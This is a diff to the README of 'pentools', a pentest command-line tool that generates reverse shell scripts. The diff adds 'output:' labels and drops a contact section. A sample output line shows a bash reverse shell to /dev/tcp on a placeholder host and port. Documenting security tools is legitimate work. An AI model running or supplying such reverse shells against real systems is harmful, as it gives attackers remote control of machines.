@@ -28,6 +28,7 @@ Add the ```-f``` flag to see available scripts.
 ```
 pentools list rev  -f
 ```
+output:
 ```
 Available scripts and types
 
@@ -45,6 +46,7 @@ Retrieve and format a specific script based on id.
 ```
 pentools script -i 1 -ho example.ip -p 12345 -s bin/bash
 ```
+output:
 ```
 ---------------(code)---------------
 
@@ -52,8 +54,6 @@ bin/bash -i >& /dev/tcp/example.ip/12345 0>&1
 
 -------------(end code)-------------
 ```
-### Contact
-* Email me at <sarartur.ruk@gmail.com> or open a new [Issue](https://github.com/sarartur/pentools/issues) on Github.
 
 
         
